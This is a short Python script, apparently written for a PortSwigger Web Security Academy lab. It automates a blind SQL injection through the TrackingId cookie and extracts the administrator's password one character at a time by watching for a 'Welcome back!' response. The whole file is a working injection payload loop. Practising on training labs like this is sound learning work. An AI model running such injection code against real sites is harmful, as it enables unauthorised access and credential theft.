import string
import requests

# This script was written while resolving a lab on portswigger where it was requested to perform
# a blind SQL injection. I was struggling doing it request by request, so I knew Python could have
# helped me, even if I had never written a Python script before. This was the first one, and also 
# a success I'd say!


characters = string.digits + string.ascii_lowercase
url = "https://0a77006204faeba7c0c961c000fb0005.web-security-academy.net/"
real_trackingid = "IvnkZpFFvVtuPUlA"

found = False
i = 0
pwd = ""

while found == False:

	for char in characters:
		cookies_dict = {"TrackingId": f"{real_trackingid}' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, {i+1}) > '{pwd}{char}"}
		response = requests.get(url, cookies=cookies_dict)
		
		if (b"Welcome back!") not in response.content:
			pwd += char
			print(pwd)
			cookies_dict = {"TrackingId": f"{real_trackingid}' AND (SELECT password FROM users WHERE username = 'administrator') = '{pwd}"}
			response = requests.get(url, cookies=cookies_dict)
		
			if (b"Welcome back!") in response.content:
				found = True
				print("Found!")

			break
	
	i += 1